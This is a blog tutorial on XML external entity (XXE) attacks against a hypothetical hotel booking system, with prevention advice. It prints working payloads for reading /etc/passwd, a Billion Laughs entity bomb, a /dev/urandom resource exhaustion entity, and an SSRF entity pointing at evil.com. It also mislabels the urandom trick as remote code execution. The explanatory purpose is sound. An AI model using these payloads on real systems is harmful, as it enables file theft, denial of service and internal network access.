---
title: XXE Attacks
contributor: Gert J. Oberh
avatar: kobus-oberholzer.png
description: A summary on external entity injections, how they are used in an attack and how to prevent most of them
date: 2022-10-13
tags: [XML, Security]
id: xxe-attacks
relatedPost: react-xss
---

In recent years, there has been an increase in the number of XXE (external entity attacks) injections. These attacks take advantage of vulnerabilities in XML processing to inject malicious code into a system. This can allow attackers to gain access to sensitive data or even take control of the system altogether. Fortunately, there are steps you can take to prevent XXE attacks. In this blog post, we will explore some of the most common methods used by attackers and how you can protect your systems against them.

## Table of Contents
<!-- toc -->

## What is an XXE attack?

An XXE attack is a type of attack that exploits vulnerabilities in an XML parser to deliver an XXE payload. This can allow attackers to read local files, send HTTP requests to internal resources, and even perform denial-of-service attacks.

To prevent XXE attacks, it's important to keep your software up to date and to use a **web application firewall** (WAF) to block malicious requests.

## How do XXE attacks work?

An XXE attack occurs when an attacker exploits a vulnerability in an weakly configured XML parser to gain access to sensitive information. The attacker sends specially crafted XML data to the vulnerable parser, which then processes the data and returns the results to the attacker. This can be used to view files on the server, execute commands, or even gain access to other servers on the network.

XXE attacks are often possible due to poor input validation. For example, if an application allows users to upload XML files, but does not properly validate the contents of those files, an attacker could upload a malicious file that contains code that would be executed by the XML parser.

To prevent XXE attacks, it is important to properly validate all input, especially input that comes from untrusted sources. All XML parsers should be configured to disable the processing of external entities by default. If external entities must be processed for some reason, strict validation should be used to ensure that only trusted entities are processed.

## How XXE attacks are used

To demonstrate the different ways XXR attacks work, let's set a scene. A booking system for a hotel is being attacked and we need to evaluate all potential attack vectors.

### Retrieve local files

A very basic way XXE payloads can be used is to retrieve files from the server. Let's say the original usage of XML file was to retrieve information on a booking made by a client like so:

    <?xml version="1.0" encoding="UTF-8"?>
    <bookingId>23</bookingId>

We can adjust this XML data to retrieve files we specify and let it return the results.

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE foo [
       <!ELEMENT foo ANY>
       <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <bookingId>&xxe;</bookingId>

This is considered an **in-band** attack as the vector of attack is clear and the information retrieved is in the form of a response. Another type of attack is called an **out-of-band** attack like a blind attack.

### Blind attack

Blind attacks are when there are some forms of security measures in place that would prevent you from directly requesting privileged information. There is however still a potential attack surface that is just more hidden, by doing a bind attack you may potentially stumble upon a server response in the shape of an error message that reveals more information than intended, an example would be if the parser's error response is disclosing local files which the attacker can choose to infiltrate.

### Denial of service attack

If the attention is not necessary to retrieve data but to deny service, maybe a popular band is performing and the bad actor wants to have a peaceful stay by preventing other potential guests from booking.

This would be the ideal scenario to dispatch a DOS attack. One such attack type is called A Billion Laughs attack.

    ```
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE lolz [
       <!ENTITY lol "lol">
       <!ELEMENT lolz (#PCDATA)>
       <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
       <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
       <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
       <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
       <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
       <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
       <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
       <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
       <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>
    ```

Now the reason for the name has become prevalent, let's discuss how it works. First, lol9 will be called which in turn calls lol8 that calls lol7... and this will continue turning kb's of data into GB's within moments.

Another popular way of achieving the same outcome can be done using remote code execution. Asuming the server operates on Linux, an endless recursive file can be called as follows.

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE foo [
        <!ELEMENT foo ANY>
        <!ENTITY xxe SYSTEM "file:///dev/urandom">
    ]>
    <foo>&xxe;</foo>

The goal of this type of attack is to use all server resources possibly impacting application availability

### Server-side request forgery (SSRF)

Server-side request forgery happens when the payload appears to be from internal systems, which grants the attacker access to local resources as if authorized.

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE foo [
        <!ELEMENT foo ANY>
        <!ENTITY xxe SYSTEM "http://evil.com/">
    ]>
    <foo>&xxe;</foo>

This type of attack can be used as the door to a multitude of other attacks and exploits, such as remote code execution, DOS attacks, or just simply gaining access to privileged information, all while leaving a backdoor for future attacks.

{% img "ssrf-attack.png" "SSRF XXE Attack" "lazy" %}

## How to prevent XXE attacks

XXE attacks exploit vulnerabilities in the way that XML parsers process input. An attacker can supply malicious input to an XML parser in order to cause it to execute unintended actions or access sensitive information.

There are several methods that can be used to prevent XXE vulnerabilities. First, make sure that your XML parser is configured to disable external entity processing. This will ensure that the parser does not automatically resolve external references when processing input.

Next, use positive security controls such as input validation and output encoding. Input validation ensures that all input supplied to the XML parser is well-formed and does not contain any malicious code. Output encoding ensures that any data retrieved from the XML document is properly escaped so that the browser cannot execute it.

Finally, keep your software up to date. Newer versions of XML parsers typically include fixes for XXE vulnerabilities as they are discovered. By keeping your software up to date, you can help to protect yourself against these types of attacks.

## What to do if you're a victim of an XXE attack

If you're a victim of an XXE attack, you should first report the incident to your organization's security team. They'll be able to investigate the attack and take steps to prevent it from happening again.

You should also change any passwords that may have been compromised in the attack. Be sure to use strong, unique passwords for all of your accounts. And finally, stay vigilant for any suspicious activity on your accounts or devices.

## Conclusion

XXE attacks are a serious security threat, but they can be prevented with the right precautions. Be sure to disable external entity parsing in your XML parser, and use a whitelist approach when processing untrusted XML input. With these measures in place, you can rest assured that your applications will be safe.

If any of these topics interests you and you would like to prevent other potential vulnerabilities like this, we offer a complete course on developing with security matters in mind at [websecurity-academy](https://websecurity-academy.com/).
